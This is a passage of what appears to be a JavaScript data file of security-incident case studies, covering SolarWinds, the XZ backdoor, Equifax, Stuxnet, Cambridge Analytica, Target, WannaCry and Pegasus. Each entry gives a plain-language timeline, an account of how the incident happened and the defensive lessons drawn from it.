  { n: "Code signing answers the question *did this come from the vendor and arrive unmodified*. Here the answer was genuinely yes. The signature was valid because the vendor really did build and sign it. Signing verifies the channel, not the contents — and this incident is what made that distinction concrete for a lot of engineers.",
    nt: "Signed does not mean safe" },

  { h: "The tradecraft" },
  { l: [
   "SUNBURST stayed dormant for up to two weeks after installation before doing anything, defeating short-window sandbox analysis.",
   "It checked for analysis tools and known security-vendor environments and stayed inert if it found them.",
   "It used a domain generation algorithm and communicated over a protocol designed to look like Orion's own legitimate telemetry traffic.",
   "Of roughly 18,000 organisations that installed the trojanised update, the attackers selected a much smaller number — reported as fewer than 100 — for the second-stage intrusion. Broad distribution, narrow exploitation."
  ] },
  { tl: [
    { t: "Sept 2019", d: "Attackers access the SolarWinds build environment and test their ability to inject code." },
    { t: "Feb–Jun 2020", d: "SUNBURST is included in Orion builds and distributed through official updates." },
    { t: "Through 2020", d: "Selected targets are exploited, including US Treasury, Commerce, Homeland Security and multiple technology firms." },
    { t: "Dec 2020", d: "FireEye investigates an anomalous second-factor enrolment on an employee account, discovers its own red-team tooling has been stolen, traces the intrusion to Orion, and discloses publicly." }
  ] },

  { h: "How it was actually found" },
  { p: "No scanner caught it. FireEye's security team noticed that an employee had registered an additional device for two-factor authentication — a small, unexplained anomaly. Investigating that led them to a full compromise of their own network, and from there to the Orion software they, like thousands of others, were running." },
  { p: "The detection came from someone taking a minor authentication anomaly seriously enough to chase it. That is a recurring pattern in supply chain discovery: the XZ backdoor four years later was found the same way, by an engineer investigating an unexplained half-second of latency." },

  { h: "What changed" },
  { l: [
   "**Build integrity became a security boundary.** Hardening CI/CD, isolating build machines, and restricting who can modify build definitions moved into mainstream threat models.",
   "**Reproducible builds** gained real traction — if independent parties can rebuild from source and get a bit-identical artefact, injected code becomes detectable.",
   "**SLSA** (Supply-chain Levels for Software Artifacts) and in-toto attestation emerged to describe and verify provenance: not just *who signed this* but *what source and what process produced it*.",
   "**US Executive Order 14028** (May 2021) required federal software suppliers to provide SBOMs and meet secure development standards, pulling the whole industry along with it."
  ] }
 ],
 k: [
  "A valid signature proves origin, not integrity of intent — the build system is inside your trust boundary.",
  "Broad distribution with narrow exploitation is a deliberate strategy for staying hidden.",
  "Detection came from a small unexplained anomaly that someone chose to investigate.",
  "Provenance — what source and what process produced this artefact — is a stronger guarantee than signing alone."
 ],
 r: ["Supply Chain Attack", "CI/CD", "Artifact", "Authentication", "Zero Trust", "Observability", "Incident Response", "Container Registry"],
 src: [
  { t: "CISA — Emergency Directive 21-01, Mitigate SolarWinds Orion Code Compromise", u: "https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise" },
  { t: "SLSA — Supply-chain Levels for Software Artifacts", u: "https://slsa.dev/" }
 ]
},

{
 t: "The XZ Utils Backdoor",
 s: "Three years of patience, caught by 500 milliseconds",
 y: 2024, when: "March 2024",
 g: ["supply chain", "social engineering", "open source", "maintainer burnout"],
 tldr: "An attacker spent roughly three years building a reputation as a helpful contributor to xz, a compression library present on virtually every Linux system, eventually becoming co-maintainer. They then shipped an obfuscated backdoor — present in the release tarballs but not the git repository — that hooked SSH authentication to allow remote access. It was caught weeks before reaching stable distributions by a database engineer who noticed logins were half a second slower than they should be.",
 say: [
  "The attack was not technical, it was social: three years of legitimate contributions to earn commit rights.",
  "The backdoor was in the release tarball, not in git — so reading the repository would not have shown it.",
  "Andres Freund found it because SSH logins were taking about 500ms longer than expected and he was curious enough to profile it.",
  "The uncomfortable part is that the pressure campaign exploited a burnt-out solo maintainer, which describes an enormous amount of critical infrastructure."
 ],
 b: [
  { h: "The long game" },
  { p: "xz and its library liblzma provide XZ compression. They are unglamorous, extremely widely installed, and were maintained by essentially one person, Lasse Collin, on an unpaid basis." },
  { tl: [
    { t: "2021", d: "An account under the name *Jia Tan* begins contributing to xz and related projects. The contributions are legitimate and useful." },
    { t: "2022", d: "Pressure appears on the mailing list from several accounts complaining about slow patch review and urging that another maintainer be added. Collin, who had publicly mentioned mental health difficulties and limited time, gradually grants more responsibility." },
    { t: "2023", d: "Jia Tan is committing releases. Changes appear that make later concealment easier, including modifications to build and test infrastructure." },
    { t: "Feb 2024", d: "Versions 5.6.0 and then 5.6.1 ship containing the backdoor, hidden inside binary test fixture files and assembled during the build." },
    { t: "29 Mar 2024", d: "Andres Freund discloses publicly. Distributions pull the affected versions within hours." }
  ] },

  { h: "How it was hidden" },
  { p: "The malicious code was not visible in the git repository. It was introduced through the **release tarball**, which is generated by the maintainer and is what distributions actually build from. The build scripts in the tarball differed from those in the repository." },
  { l: [
   "The payload was carried inside files presented as corrupted test data for the compression tests — binary blobs where nobody expects readable content.",
   "A modified `configure` step extracted and assembled the payload only when building an RPM or DEB package on x86-64 Linux, so casual builds did not produce it.",
   "The resulting liblzma hooked the symbol resolution used by OpenSSH. Many distributions patch sshd to link against systemd for notification, which pulls in liblzma indirectly — so a compression library ended up inside the SSH authentication path.",
   "The backdoor checked for a specific attacker key. With it, an attacker could bypass authentication entirely; without it, sshd behaved normally, so black-box testing revealed nothing."
  ] },

  { h: "The 500 milliseconds" },
  { p: "Andres Freund, a PostgreSQL developer working at Microsoft, was running benchmarks and noticed that SSH logins on a Debian testing system were consuming noticeably more CPU than expected and taking around half a second longer. He had also seen some Valgrind errors he could not explain." },
  { q: "I didn't even have a plausible theory of what was going on. I just wanted to know why it was slow.", by: "Andres Freund, on finding the xz backdoor" },
  { p: "He profiled it, traced the CPU time into liblzma, and unpicked the rest. The backdoor was in Debian testing, Fedora Rawhide and other pre-release channels, but had not yet reached stable releases of the major distributions. Had it shipped a few weeks later, it would have been in production on a very large number of servers." },
  { n: "Every account of this incident acknowledges that discovery was luck. A performance-sensitive engineer with the skills to profile a shared library happened to be running a pre-release distribution and happened to be curious about a delay most people would never notice. That is not a security control.",
    nt: "It was found by accident" },

  { h: "What changed" },
  { l: [
   "**Maintainer burnout became a security topic.** The pressure campaign is a documented technique now, and *is this project maintained by one exhausted volunteer* is a supply chain risk question.",
   "**Tarball-versus-repository divergence** got attention. Building from the git tag rather than the generated tarball, and reproducible builds that make the two comparable, moved up the agenda.",
   "**Binary test fixtures** are now viewed with more suspicion — opaque files in a source tree are a place to hide things.",
   "**Dependency depth into sshd** surprised a lot of people. The chain from a compression library to the authentication path ran through distribution-specific patching that few had traced."
  ] }
 ],
 k: [
  "Commit access is earned socially, and that process can be attacked over years.",
  "What distributions build is the release tarball, which is not necessarily what is in the repository.",
  "A solo unpaid maintainer of critical infrastructure is a structural risk, not a personal failing.",
  "Detection here was a performance anomaly investigated out of curiosity — build systems that make divergence detectable are the actual control."
 ],
 r: ["Supply Chain Attack", "Open Source", "SSH", "Authentication", "CVE", "Dependency", "Compiler", "Zero Trust"],
 src: [
  { t: "CVE-2024-3094 — National Vulnerability Database", u: "https://nvd.nist.gov/vuln/detail/CVE-2024-3094" },
  { t: "Andres Freund — original disclosure, oss-security mailing list", u: "https://www.openwall.com/lists/oss-security/2024/03/29/4" }
 ]
},

{
 t: "The Equifax Breach",
 s: "One unpatched server, 147 million people",
 y: 2017, when: "May–July 2017",
 g: ["patching", "asset inventory", "certificates", "detection"],
 tldr: "A known Apache Struts vulnerability with a patch available in March went unpatched on one Equifax server because the company's scan did not find it. Attackers used it in May and stayed for 76 days. They were not detected because an expired certificate had left a network inspection device blind for nineteen months; within minutes of the certificate being renewed, the exfiltration was visible. Personal data on 147 million people was taken.",
 say: [
  "The vulnerability was public and patched two months before the intrusion — this was a patch management and asset inventory failure, not a zero-day.",
  "The detail everyone remembers: an expired certificate meant their traffic inspection had been blind for 19 months, and renewing it immediately revealed the breach.",
  "It is the standard example of why detection matters as much as prevention — the intrusion lasted 76 days.",
  "The settlement was around $700 million, and the CEO, CIO and CSO all left."
 ],
 b: [
  { h: "The way in" },
  { p: "Apache Struts is a Java web framework. In March 2017, CVE-2017-5638 was disclosed: a flaw in how Struts parsed the `Content-Type` header allowed remote code execution. A patch was released the same day, and the vulnerability was widely publicised — it was actively exploited within days." },
  { p: "Equifax circulated an internal notice to patch. The scan run to confirm compliance did not detect the vulnerable installation on a consumer dispute portal, and that server remained unpatched. The company did not have a complete, authoritative inventory of where Struts was deployed." },

  { h: "76 days inside" },
  { tl: [
    { t: "7 Mar 2017", d: "CVE-2017-5638 disclosed with a patch available." },
    { t: "9 Mar 2017", d: "Equifax circulates an internal patching notice." },
    { t: "15 Mar 2017", d: "Scans run to verify patching. They do not find the vulnerable server." },
    { t: "13 May 2017", d: "Attackers exploit the unpatched portal and gain access." },
    { t: "May–Jul 2017", d: "Attackers move through the network, locate unencrypted credentials in a file share, and use them to reach 48 databases. Queries and exfiltration continue for weeks." },
    { t: "29 Jul 2017", d: "An expired certificate on a traffic-inspection device is renewed. Inspection resumes and the exfiltration is immediately visible. Access is cut the next day." },
    { t: "7 Sep 2017", d: "Equifax discloses publicly." }
  ] },

  { h: "The certificate" },
  { p: "Equifax used a device that decrypted and inspected outbound network traffic. To do that it needed a valid certificate. That certificate had expired nineteen months earlier and had not been renewed, so the device was passing traffic through without inspecting it." },
  { n: "A security control that silently stops working is worse than one you never had, because it occupies the space in your architecture diagram where a working control should be. Certificate and licence expiry belongs on the same monitoring footing as disk space — and every control should emit a heartbeat proving it is doing something, not merely that the process is running.",
    nt: "Controls that fail silently" },
  { p: "When the certificate was finally renewed on 29 July, staff saw suspicious traffic within a very short time. The detection capability had existed the whole time. It had simply been switched off by an administrative oversight nobody was monitoring." },

  { h: "What compounded it" },
  { l: [
   "Credentials for database access were stored unencrypted on a file share reachable from the compromised server, which turned a single web-server compromise into access to dozens of databases.",
   "Network segmentation was insufficient — the dispute portal should not have had a path to that data.",
   "Data was retained far beyond what was needed, so the exposure included records on people who had no active relationship with Equifax.",
   "The public response went badly: a hastily built response site on a look-alike domain, confusion over whether using it waived legal rights, and executives selling shares before disclosure."
  ] },
  { p: "The final scope was around 147 million people — names, dates of birth, addresses, and Social Security numbers, plus credit card numbers for a smaller subset. The 2019 FTC settlement was worth at least $575 million and potentially up to $700 million." },

  { h: "What changed" },
  { p: "Patch management and asset inventory got board-level attention in a way they had not before: you cannot patch what you do not know you run. Certificate lifecycle monitoring became standard tooling. And segmentation plus credential hygiene — no plaintext credentials on shares, least privilege between tiers — moved from best practice toward baseline expectation, particularly in regulated data businesses." }
 ],
 k: [
  "An incomplete asset inventory turns a patched vulnerability into an unpatched one.",
  "Security controls fail silently; monitor that they are working, not just that they exist.",
  "Time-to-detection often does more damage than the initial vulnerability.",
  "Flat networks and plaintext credentials turn one compromised host into a total compromise."
 ],
 r: ["CVE", "Zero-Day", "Principle of Least Privilege", "Defence in Depth", "Authentication", "TLS", "Monitoring", "Incident Response"],
 src: [
  { t: "US GAO — Actions Taken by Equifax and Federal Agencies in Response to the 2017 Breach", u: "https://www.gao.gov/products/gao-18-559" },
  { t: "FTC — Equifax Data Breach Settlement", u: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" }
 ]
},

{
 t: "Stuxnet",
 s: "The worm that crossed the air gap and destroyed centrifuges",
 y: 2010, when: "2007–2010",
 g: ["cyber weapon", "scada", "zero-day", "nation state"],
 tldr: "A worm of unprecedented sophistication targeted Iran's uranium enrichment facility at Natanz. It spread via USB drives across air-gapped networks, used four zero-day exploits and stolen digital certificates, and reprogrammed Siemens PLCs to spin centrifuges at destructive speeds while reporting normal telemetry to the operators. It destroyed roughly 1,000 centrifuges and set Iran's nuclear programme back by an estimated one to two years. It is the first confirmed case of a cyber weapon causing physical destruction.",
 say: [
  "It used four zero-day exploits simultaneously — an unheard-of expenditure of offensive capability for a single operation.",
  "It jumped the air gap via infected USB drives, which means physically isolated networks are not as isolated as people assume.",
  "The PLC manipulation was the breakthrough: it changed centrifuge speeds while replaying normal telemetry to the control room, so operators saw nothing wrong.",
  "It was almost certainly a joint US-Israeli operation (codenamed Olympic Games), though neither government has officially confirmed it."
 ],
 b: [
  { h: "What it targeted" },
  { p: "Iran's Natanz uranium enrichment facility used Siemens S7-300 series PLCs (Programmable Logic Controllers) to control the speed of gas centrifuges used to enrich uranium. The centrifuges are physically delicate — they spin at supersonic rim speeds, and small variations in frequency can cause them to fail catastrophically." },
  { p: "The facility was air-gapped — not connected to the internet. The attackers needed the malware to cross that gap, find the specific Siemens controllers among all possible targets worldwide, and manipulate the enrichment process without being detected." },

  { h: "How it worked" },
  { l: [
   "**Propagation.** The worm spread via USB drives and Windows network shares, using four zero-day exploits including a Windows Shell LNK vulnerability and a print spooler flaw. It used stolen digital certificates from Realtek and JMicron to sign its drivers, so Windows loaded them without warning.",
   "**Target identification.** On each machine, Stuxnet checked for Siemens Step 7 software and specific PLC configurations. If it did not find the exact target environment, it did nothing destructive — it only spread further.",
   "**PLC manipulation.** When it found the right controllers, it injected code that periodically changed the frequency converter speeds — spinning centrifuges too fast, then too slow, causing mechanical stress and eventual failure.",
   "**Telemetry spoofing.** While manipulating the centrifuges, it recorded normal operating data and replayed it to the monitoring systems, so operators saw healthy readings while equipment was being destroyed."
  ] },
  { n: "The replay attack on the telemetry is the detail that elevates this from a sophisticated worm to something qualitatively different. The operators were looking at their screens, seeing normal values, while the physical process was being sabotaged. It is the digital equivalent of looping a security camera.",
    nt: "They faked the readings" },

  { h: "Discovery" },
  { p: "Stuxnet escaped its intended target — likely through an infected laptop leaving Natanz — and spread to machines worldwide. In June 2010, VirusTotal received a sample from Iran, and Sergey Ulasen at a Belarusian antivirus firm identified it. Symantec and other researchers spent months reverse-engineering it, gradually uncovering the PLC payload." },
  { tl: [
    { t: "2007–2008", d: "Early versions deployed, likely for reconnaissance." },
    { t: "2009–2010", d: "More aggressive variants deployed. Centrifuges at Natanz begin failing at elevated rates." },
    { t: "Jun 2010", d: "Stuxnet is discovered in the wild by antivirus researchers." },
    { t: "Sep 2010", d: "Symantec publishes detailed analysis revealing the PLC payload." },
    { t: "Nov 2010", d: "Iran acknowledges the centrifuge damage. Natanz operations are temporarily halted." }
  ] },

  { h: "What it changed" },
  { l: [
   "It demonstrated that software can cause physical destruction of industrial equipment — crossing the line from espionage to sabotage.",
   "Air-gapped networks are no longer considered inherently secure. USB-based propagation is now a standard threat model for critical infrastructure.",
   "SCADA and ICS (Industrial Control System) security became a field, not an afterthought. Siemens and others invested heavily in PLC security.",
   "It set a precedent for state-sponsored cyber weapons that subsequent operations (Shamoon, NotPetya, Triton) followed.",
   "It raised fundamental questions about the ethics and legality of cyber operations that international law has still not fully resolved."
  ] }
 ],
 k: [
  "Software can cross an air gap via removable media and cause physical destruction.",
  "The most dangerous part was not the exploit chain — it was spoofing the telemetry so operators could not see the damage.",
  "Four zero-days and stolen certificates show what a nation-state budget buys in offensive capability.",
  "Industrial control systems were designed for safety and reliability, not for adversarial environments — and retrofitting security is ongoing."
 ],
 r: ["Zero-Day", "Buffer Overflow", "Firmware", "Defence in Depth", "Supply Chain Attack", "Endpoint", "Encryption"],
 src: [
  { t: "Symantec — W32.Stuxnet Dossier", u: "https://docs.broadcom.com/doc/security-response-w32-stuxnet-dossier-11-en" },
  { t: "Langner — To Kill a Centrifuge: A Technical Analysis of What Stuxnet's Creators Tried to Achieve", u: "https://www.langner.com/to-kill-a-centrifuge/" }
 ]
},

{
 t: "The Cambridge Analytica Scandal",
 s: "An API, a quiz, and 87 million profiles",
 y: 2018, when: "2014–2018",
 g: ["data privacy", "api design", "consent", "ethics"],
 tldr: "A researcher built a Facebook quiz app that collected not just the quiz-taker's data but the data of all their friends — roughly 87 million profiles — through Facebook's Graph API, which permitted this by design. The data was passed to Cambridge Analytica, a political consulting firm, and used for voter profiling. The scandal led to a $5 billion FTC fine against Facebook, GDPR enforcement acceleration, and a fundamental rethinking of API permission models across the industry.",
 say: [
  "The data collection was not a hack — it used Facebook's API exactly as designed. The API let any app access a user's friends' data without those friends' consent.",
  "About 270,000 people installed the quiz app. Through friends-of-friends access, it harvested data on 87 million people.",
  "It is the defining case for why API permission scoping matters — an API that exposes more data than necessary will be misused.",
  "It directly accelerated GDPR enforcement and led to the largest FTC privacy fine in history."
 ],
 b: [
  { h: "The mechanism" },
  { p: "In 2014, Aleksandr Kogan, a researcher at Cambridge University, built a personality quiz app called *thisisyourdigitallife*. About 270,000 Facebook users installed it and granted it access to their profiles." },
  { p: "At the time, Facebook's Graph API v1.0 allowed apps to access not just the installing user's data but also the data of all their Facebook friends — profile information, likes, location and more. The friends had not installed the app and had not consented to data collection. Through this mechanism, the app harvested data on approximately 87 million Facebook users." },
  { n: "This was not a vulnerability. It was a feature. Facebook's API was designed to allow this level of access because it made the platform more useful for developers and drove app ecosystem growth. The scandal is about what happens when an API permission model prioritises developer convenience over user privacy.",
    nt: "It was the API working as designed" },

  { h: "The political use" },
  { p: "Kogan passed the harvested data to Cambridge Analytica, a political consulting firm. Cambridge Analytica used the data to build psychographic profiles of US voters — modelling personality traits from Facebook likes and activity — and used those profiles for targeted political advertising during the 2016 US presidential election and the Brexit referendum." },
  { p: "The effectiveness of the psychographic targeting is debated. What is not debated is that 87 million people's data was collected without their knowledge or consent, transferred to a third party in violation of Facebook's terms of service, and used for purposes none of them had agreed to." },

  { h: "The fallout" },
  { tl: [
    { t: "2014", d: "Data is harvested through the quiz app." },
    { t: "2015", d: "Facebook learns of the data transfer to Cambridge Analytica, asks for deletion, and takes no further action." },
    { t: "Mar 2018", d: "The Guardian and New York Times publish investigations. Christopher Wylie, a former Cambridge Analytica employee, provides detailed testimony." },
    { t: "Apr 2018", d: "Mark Zuckerberg testifies before US Congress." },
    { t: "Jul 2019", d: "FTC fines Facebook $5 billion — the largest privacy fine ever imposed." },
    { t: "2018–2020", d: "Cambridge Analytica files for bankruptcy. GDPR enforcement accelerates across Europe." }
  ] },

  { h: "What changed for engineers" },
  { l: [
   "**API permissions were restructured.** Facebook restricted the Graph API so apps can only access the installing user's data, not their friends' data. Other platforms followed.",
   "**Principle of least privilege in APIs** became a design requirement, not a suggestion. Ask for the minimum data needed, scope access tightly.",
   "**Consent became a first-class engineering concern.** GDPR's requirement for informed, specific, unambiguous consent changed how permission dialogs are designed.",
   "**Data portability and deletion** became required features, not nice-to-haves. Users must be able to see what data an app has and request its removal.",
   "**Ethics in tech** entered university curricula. The case is now standard in CS ethics courses."
  ] }
 ],
 k: [
  "An API that exposes more data than necessary will eventually be used to harvest it.",
  "Friends-of-friends data access means one user's consent decision affects millions.",
  "Detecting policy violations (data transfer to third parties) is much harder than preventing them through API design.",
  "The cost of not building privacy into the API was $5 billion and a permanent loss of public trust."
 ],
 r: ["API", "Authentication", "Principle of Least Privilege", "GDPR", "OAuth 2.0", "Zero Trust"],
 src: [
  { t: "The Guardian — Cambridge Analytica Files", u: "https://www.theguardian.com/news/series/cambridge-analytica-files" },
  { t: "FTC — FTC Imposes $5 Billion Penalty on Facebook (2019)", u: "https://www.ftc.gov/news-events/news/press-releases/2019/07/ftc-imposes-5-billion-penalty-one-sweeping-new-privacy-restrictions-facebook" }
 ]
},

{
 t: "The Target Data Breach",
 s: "From the HVAC vendor to 40 million credit cards",
 y: 2013, when: "November–December 2013",
 g: ["lateral movement", "third party", "segmentation", "pos"],
 tldr: "Attackers stole credentials from Fazio Mechanical, a small HVAC contractor that had network access to Target for billing and project management. Using those credentials, they moved laterally through Target's network to the point-of-sale systems, installed memory-scraping malware, and exfiltrated data on 40 million credit and debit cards plus personal information on 70 million customers. The total cost exceeded $200 million. It is the standard case study for third-party risk and network segmentation.",
 say: [
  "The entry point was an HVAC contractor's stolen credentials — not a sophisticated zero-day, not even a Target employee.",
  "The HVAC vendor had access to the same network segment as the POS systems, which is the segmentation failure that made it possible.",
  "The POS malware scraped card data from RAM in the brief moment between the card swipe and encryption — a technique called RAM scraping.",
  "FireEye's security system actually detected the malware and generated alerts. The alerts were not acted on."
 ],
 b: [
  { h: "The kill chain" },
  { p: "Fazio Mechanical was a refrigeration and HVAC contractor that worked with Target. Like many vendors, it had remote access to Target's network for electronic billing, contract submission and project management. The attackers compromised Fazio's systems — likely through a phishing email — and stole the vendor credentials." },
  { tl: [
    { t: "Late Nov 2013", d: "Attackers use Fazio Mechanical's credentials to access Target's network." },
    { t: "Nov–Dec 2013", d: "Lateral movement through the network. Attackers reach POS systems." },
    { t: "27 Nov 2013", d: "Memory-scraping malware (BlackPOS variant) is installed on POS terminals. Black Friday — the busiest shopping day of the year." },
    { t: "2–15 Dec 2013", d: "Card data is exfiltrated to staging servers inside Target's network, then to external servers." },
    { t: "12 Dec 2013", d: "The Department of Justice notifies Target of the breach." },
    { t: "19 Dec 2013", d: "Target publicly discloses the breach." }
  ] },

  { h: "Why the network allowed it" },
  { p: "The fundamental failure was that Target's network did not adequately segment vendor access from payment systems. An HVAC contractor's credentials should never have provided a path — direct or indirect — to point-of-sale terminals." },
  { l: [
   "**No meaningful segmentation.** The vendor portal and POS systems were reachable through the same network, allowing lateral movement.",
   "**Vendor credentials had excessive access.** The credentials were not scoped to the minimum required systems.",
   "**POS systems were Windows-based and not hardened.** They ran standard Windows XP Embedded, making malware installation straightforward.",
   "**Exfiltration used Target's own infrastructure.** Data was staged on internal servers before being sent to external drop sites, blending with normal traffic."
  ] },
  { n: "Target had deployed FireEye's malware detection system, which identified the BlackPOS malware and generated alerts. The security team in Bangalore escalated the alerts to the Minneapolis team. No action was taken. The technology worked. The process around it did not.",
    nt: "The alarm went off and was ignored" },

  { h: "What changed" },
  { l: [
   "**Third-party risk management** became a standard security practice. Vendor access is now audited, scoped and segmented from sensitive systems.",
   "**Network segmentation** for PCI (Payment Card Industry) compliance was tightened. Cardholder data environments must be isolated.",
   "**EMV chip cards** were accelerated in the US. Chip cards are resistant to the RAM-scraping technique because the card data is encrypted differently.",
   "**The CISO role gained authority.** Target's CIO and CEO resigned. The breach demonstrated that security failures have C-suite consequences.",
   "Total costs exceeded $200 million, including an $18.5 million multistate settlement."
  ] }
 ],
 k: [
  "Third-party vendor access is an attack surface — every vendor with network access is an entry point.",
  "Network segmentation is not optional: billing systems and payment terminals must not share a flat network.",
  "Detection that generates alerts nobody acts on is indistinguishable from no detection.",
  "The weakest link was not Target's code — it was a small contractor's email security."
 ],
 r: ["Defence in Depth", "Zero Trust", "Principle of Least Privilege", "Endpoint", "Monitoring", "Incident Response", "Encryption"],
 src: [
  { t: "US Senate Committee — A 'Kill Chain' Analysis of the 2013 Target Data Breach", u: "https://www.commerce.senate.gov/services/files/24d3c229-4f2f-405d-b8db-a3a67f183883" },
  { t: "Krebs on Security — A First Look at the Target Intrusion, Malware", u: "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/" }
 ]
},

{
 t: "WannaCry",
 s: "An NSA exploit, leaked, then weaponised worldwide",
 y: 2017, when: "12 May 2017",
 g: ["ransomware", "smb", "patching", "nsa"],
 tldr: "A ransomware worm combined EternalBlue — an NSA exploit for a Windows SMB vulnerability, leaked by the Shadow Brokers group — with a self-propagating mechanism that spread across networks without user interaction. In a single day it infected over 200,000 machines in 150 countries, crippling the UK's National Health Service, Telefónica, FedEx, Renault and many others. A security researcher accidentally found a kill switch — a domain name the malware checked before executing — and registered it, dramatically slowing the spread.",
 say: [
  "EternalBlue was an NSA exploit for a Windows SMB vulnerability. Microsoft had patched it two months before WannaCry, but many organisations had not applied the patch.",
  "It spread without user interaction — no phishing email, no clicked link. If your machine was reachable on SMB and unpatched, it was compromised.",
  "The kill switch was a domain name the malware queried before encrypting. Marcus Hutchins registered it on a hunch, which stopped most new infections.",
  "It hit the UK NHS hardest — hospitals diverted ambulances and cancelled surgeries because their systems were locked."
 ],
 b: [
  { h: "The exploit chain" },
  { p: "In April 2017, a group called the Shadow Brokers publicly released a collection of tools believed to have been stolen from the NSA's Tailored Access Operations unit. Among them was **EternalBlue**, an exploit for CVE-2017-0144 — a vulnerability in Windows' SMBv1 protocol that allowed remote code execution without authentication." },
  { p: "Microsoft had released patch MS17-010 in March 2017 — one month before the leak and two months before WannaCry. The patch was available. Many organisations, particularly those running Windows XP or with slow patching cycles, had not applied it." },

  { h: "The worm" },
  { p: "WannaCry combined EternalBlue with a self-propagating worm mechanism. Once it compromised a machine, it scanned the local network and the internet for other machines with open SMB ports, exploited them, and spread. No user interaction was required." },
  { l: [
   "**Encryption.** On each compromised machine, WannaCry encrypted files with RSA-2048 and AES-128, appending `.WNCRY` to filenames.",
   "**Ransom demand.** A screen demanded $300–$600 in Bitcoin for the decryption key.",
   "**Propagation.** The worm component continuously scanned for vulnerable machines. Inside corporate networks with flat topologies, it spread in minutes.",
   "**Scale.** Within hours, over 200,000 machines in 150 countries were infected."
  ] },

  { h: "The kill switch" },
  { p: "Marcus Hutchins (MalwareTech), a 22-year-old security researcher in the UK, was analysing the malware and noticed it made an HTTP request to a specific unregistered domain name before executing. If the domain responded, the malware halted." },
  { n: "Hutchins registered the domain for about $10.69, expecting it to be a sinkhole for command-and-control traffic. It immediately started receiving hundreds of thousands of connections per second from infected machines worldwide — and new infections effectively stopped. The domain check was likely a sandbox evasion technique (sandbox environments often resolve all domains), accidentally creating a global kill switch.",
    nt: "A $10.69 domain saved billions" },
  { tl: [
    { t: "12 May 2017, morning", d: "WannaCry begins spreading. Telefónica in Spain is among the first major victims." },
    { t: "12 May, midday", d: "UK NHS hospitals are hit. Emergency departments divert patients. Surgeries are cancelled." },
    { t: "12 May, afternoon", d: "Hutchins registers the kill switch domain. New infections slow dramatically." },
    { t: "Following days", d: "Variants without the kill switch appear but spread less effectively." },
    { t: "Dec 2017", d: "The US, UK and others formally attribute WannaCry to North Korea's Lazarus Group." }
  ] },

  { h: "What changed" },
  { l: [
   "**Patching urgency.** The patch had been available for two months. The incident made 'patch now' a business-level conversation, not just an IT request.",
   "**Windows XP end-of-life was taken seriously.** Microsoft issued an emergency patch for XP, which had been out of support for three years.",
   "**SMBv1 was widely disabled.** The protocol was already deprecated; WannaCry gave organisations the push to actually turn it off.",
   "**The debate over government exploit stockpiling intensified.** If the NSA had disclosed the vulnerability instead of weaponising it, the patch would have existed even earlier.",
   "**Network segmentation** became critical — organisations with flat networks lost everything; segmented ones contained the blast radius."
  ] }
 ],
 k: [
  "A patch that exists but is not applied provides zero protection.",
  "Self-propagating malware on a flat network turns one compromised machine into a total compromise in minutes.",
  "Government exploit stockpiling creates risk for everyone when the exploits inevitably leak.",
  "A kill switch found by accident is not a security strategy — but it saved billions of dollars."
 ],
 r: ["CVE", "Zero-Day", "Encryption", "Operating System", "Defence in Depth", "Incident Response", "Endpoint"],
 src: [
  { t: "Microsoft — Customer Guidance for WannaCrypt attacks", u: "https://msrc-blog.microsoft.com/2017/05/12/customer-guidance-for-wannacrypt-attacks/" },
  { t: "MalwareTech — How I accidentally stopped a global cyber attack (Marcus Hutchins)", u: "https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html" }
 ]
},

{
 t: "The Pegasus Spyware",
 s: "Zero-click, zero-day, zero chance",
 y: 2021, when: "2016–2021",
 g: ["mobile security", "zero-click", "surveillance", "zero-day"],
 tldr: "NSO Group, an Israeli surveillance company, built Pegasus — spyware that could fully compromise an iPhone or Android device with no user interaction at all. Zero-click exploits delivered via iMessage or WhatsApp silently installed the spyware, which could then access messages, calls, camera, microphone, location and passwords. Investigations by Citizen Lab and the Pegasus Project revealed it had been used against journalists, activists, lawyers and heads of state in at least 45 countries.",
 say: [
  "Zero-click means no phishing, no clicked link, no user action at all. Receiving an iMessage was enough.",
  "It exploited a chain of zero-days in iOS — including a vulnerability in the iMessage image parser that Apple did not know about.",
  "Once installed, it had full access: messages, calls, camera, microphone, passwords, location, even encrypted app content.",
  "It forced Apple to build an entirely new security mode (Lockdown Mode) and fundamentally changed how mobile OS security is designed."
 ],
 b: [
  { h: "How it worked" },
  { p: "Traditional spyware requires the target to click a malicious link or install a compromised app. Pegasus eliminated that requirement entirely." },
  { l: [
   "**Zero-click delivery.** An invisible iMessage was sent to the target's phone. The message contained a specially crafted PDF or image that triggered a vulnerability in the message parser.",
   "**Exploit chain.** The initial vulnerability provided code execution in the iMessage sandbox. Additional exploits escaped the sandbox, escalated privileges, and gained kernel access.",
   "**Full device access.** With kernel-level control, Pegasus could read all messages (including Signal and WhatsApp), activate the camera and microphone, track location, extract passwords from the keychain, and capture screen content.",
   "**Anti-forensics.** Pegasus ran in memory where possible, leaving minimal traces on disk. On reboot, it would re-infect via a persistent mechanism or be re-delivered."
  ] },
  { n: "The iMessage exploit chain (FORCEDENTRY, discovered in 2021) exploited a vulnerability in Apple's CoreGraphics PDF parser. The attacker constructed a PDF that used JBIG2-encoded data to build a small computer architecture within the decompression logic — effectively creating a virtual machine inside the image parser to execute arbitrary code. Google Project Zero called it one of the most technically sophisticated exploits they had ever analysed.",
    nt: "A computer inside a PDF parser" },

  { h: "Scale of deployment" },
  { p: "In July 2021, the **Pegasus Project** — a consortium of 17 media organisations coordinated by Forbidden Stories, with technical analysis by Amnesty International's Security Lab — revealed a leaked list of approximately 50,000 phone numbers selected as potential surveillance targets." },
  { l: [
   "Targets included journalists, human rights activists, lawyers, and political figures in at least 45 countries.",
   "Confirmed targets included heads of state — French President Macron's phone number was on the list.",
   "NSO Group maintained that it sold only to governments for lawful surveillance of criminals and terrorists.",
   "Multiple governments were implicated in using it against domestic dissidents and press."
  ] },
  { tl: [
    { t: "2016", d: "Citizen Lab at the University of Toronto discovers the first Pegasus sample, targeting UAE dissident Ahmed Mansoor." },
    { t: "2019", d: "WhatsApp sues NSO Group after Pegasus is delivered via WhatsApp voice calls (the target did not need to answer)." },
    { t: "Sep 2021", d: "Apple patches FORCEDENTRY (CVE-2021-30860) after Citizen Lab reports the zero-click iMessage exploit." },
    { t: "Nov 2021", d: "The US places NSO Group on the Entity List, restricting US technology exports to it." },
